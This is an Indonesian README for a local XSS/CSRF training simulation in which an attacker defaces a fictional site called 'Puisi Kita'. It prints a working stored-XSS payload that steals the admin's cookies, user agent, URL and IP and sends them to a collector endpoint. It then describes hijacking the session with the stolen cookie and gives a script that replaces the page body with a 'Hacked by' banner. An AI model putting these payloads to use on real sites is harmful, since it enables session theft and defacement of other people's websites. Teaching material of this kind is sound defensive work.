## Simulation 1 - Mas John Website

Untuk melakukan deface pada mas John website hacker melakukannya dengan memanfaatkan celah XSS yang ada pada fitur Contact Us form. Tipe serangan yang dilakukan adalah `stored XSS`. Hacker mengirimkan payload XSS pada inputan field Nama yang ada pada form Contact Us.

Mas John tidak melakukan sanitasi terhadap karaker special pada HTML seperti `<`, `>`, `&`, `"`, `'`. Dengan tidak dilakukannya sanitasi maka inputan nama ketika ditampilkan pada admin area berpotensi mendapatkan serangan XSS.

Berikut ini adalah payload yang dikirimkan hacker pada inputan field Nama.

```
Pak Budi Baik<script>
var getTheirIp = function(onDone) {
    var ajax = new XMLHttpRequest();
    ajax.addEventListener('load', function(e) {
        onDone(this.responseText.replace("\n", ""));
    });
    ajax.open('GET', 'https://wtfismyip.com/text');
    ajax.send();
};

var postToMe = function(ipAddr) {
    var data = {
        UA: navigator.userAgent,
        Cookie: document.cookie,
        URL: location.href,
        TheirIP: ipAddr
    };

    var ajax = new XMLHttpRequest();
    var targetUrl = 'http://127.0.0.1:9091/collect/?data=' + JSON.stringify(data);

    ajax.open('GET', targetUrl);
    ajax.send();
};

getTheirIp( postToMe );
</script>
```

Fungsi dari payload diatas adalah mengirimkan data-data dari yang membuka pesan yang masuk di Contact Us dalam hal ini Mas John. Jadi ketika halaman Contact Us pada Admin area ditampilkan maka ia akan mengirimkan data ke alamat hacker yaitu `http://127.0.0.1:9091/collect/?data` informasi yang diambil adalah:

- User Agent
- Cookie
- URL
- IP dari admin

Ketika hacker sudah mendapatkan data-data diatas, dia akan mencoba untuk melakukan session hijacking dengan memanfaatkan cookie yang telah dicuri. Alamat URL sudah diketahui dari data yang diterima. Hacker tinggal mengubah Cookie pada browser sesuai dengan cookie admin yang dicuri dan harusnya akses bisa dibobol.

Langkah selanjutnya adalah melakukan deface dengan mengganti isi dari konten salah satu portfolio. Kita ambil contoh Portfolio berjudul Puisi Kita. Kebetulan Mas John tidak melakukan sanisasi terhadap output dari portfolio yang ditampilkan dari database. Sehingga memungkinkan hacker memasukkan kode HTML/Javascript apapun pada konten.

```
Puisi kita adalah sebuab website kolaborasi tulisan antar seniman puisi. Pengguna dapat mengirimkan puisi dan memberikan tanggapan pada setiap puisi yang ada.

<script>
var body = '<div style="text-align:center;margin-top:100px;"><h2>Hacked by Mas Kher</h2><p>Special thanks to 4L4Y_N4ME.</p></div>';
document.body.innerHTML = body;
document.body.style.color = 'white';
document.body.style.backgroundColor = '#111111';
</script>
```

## Menjalankan Simulasi

Download atau clone repository dari GitHub.

```
$ git clone git@github.com:rioastamal-examples/phpid-xss-csrf-simulation.git
```

Jalankan website target yaitu &quot;Puisi Kita&quot; pada port 8080.

```
$ cd phpid-xss-csrf-simulation
$ php -S 0.0.0.0:8080 \
-t phpid-xss-csrf-simulation/simulation-01/masjohn-website/public \
phpid-xss-csrf-simulation/simulation-01/masjohn-website/public/index.php
```

Pada terminal window lain jalankan Fake website untuk melakukan CSRF pada port 8081.

```
$ php -S 0.0.0.0:8081 \
-t phpid-xss-csrf-simulation/simulation-01/hacker-website/public \
phpid-xss-csrf-simulation/simulation-01/hacker-website/public/index.php
```

Untuk detil cara menjalankan serangan dapat dibaca pada slide presentasi. Gunakan browser yang berbeda ketika membuka Mas John Website dan Hacker Website untuk mendapatkan kesan simulasi yang lebih nyata.
